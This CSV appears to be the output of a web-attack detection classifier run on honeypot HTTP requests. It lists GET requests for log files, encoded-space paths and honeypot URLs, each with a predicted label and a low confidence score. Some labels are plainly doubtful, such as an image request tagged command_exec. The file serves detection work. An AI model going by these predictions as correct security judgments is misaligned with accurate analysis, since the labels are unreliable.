row_idx,text,pred_label,max_prob
49,METHOD=GET PATH=/GitHub-Mark.png QUERY= PROTOCOL=HTTP/1.1,command_exec,0.34874847531318665
50,METHOD=GET PATH=/css/style.css QUERY= PROTOCOL=HTTP/1.1,benign,0.41698718070983887
51,METHOD=GET PATH=/self.logs/error.log.2020-03-23 QUERY= PROTOCOL=HTTP/1.1,benign,0.4819962680339813
52,METHOD=GET PATH=/self.logs/access.log.2017-11-05.gz QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4753624498844147
53,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
54,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1,benign,0.5377135872840881
55,METHOD=GET PATH=/%C2%A0%C2%A0 QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.46687576174736023
56,METHOD=GET PATH=/%C3%82%C2%A0%C3%82 QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.361696720123291
57,METHOD=GET PATH=/honeypot//%22http://amunhoney.sourceforge.net//%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.42035993933677673
58,METHOD=GET PATH=/honeypot//%22http://glastopf.org//%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.4343529939651489
59,METHOD=GET PATH=/honeypot//%22http://www.maxmind.com/%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.5336403250694275
60,METHOD=GET PATH=/honeypot//%22https://twitter.com/sooshie/%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.5295597910881042
61,METHOD=GET PATH=/honeypot//%22https://twitter.com/theroxyd/%22 QUERY= PROTOCOL=HTTP/1.1,benign,0.5299971699714661
62,METHOD=GET PATH=/self.logs/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4391734302043915
63,METHOD=GET PATH=/%C2%A0 QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.47530853748321533
64,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1,suspicious_path_probe,0.4853888154029846
